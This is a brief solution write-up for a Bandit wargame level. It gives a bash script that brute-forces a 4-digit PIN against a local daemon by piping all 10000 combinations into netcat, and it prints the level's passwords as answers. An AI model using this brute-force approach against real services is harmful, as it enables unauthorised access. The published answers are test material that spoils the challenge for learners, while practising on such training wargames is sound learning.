## Objective : 
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time


## Solution : 
The password for next level is "iCi86ttT4KSNe1armKiwbQNmB3YJP3q4"

created an script to do so,
```bash
#!/bin/bash  
  
pass="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"  
  
# Connect to the service  
{  
  
 for pin in $(seq -w 0000 9999); do  
   echo "$pass $pin"  
 done  
} | nc localhost 30002
```

saved it in `/tmp` folder because home directory doesn't have permission to write.
run, this command to get password.

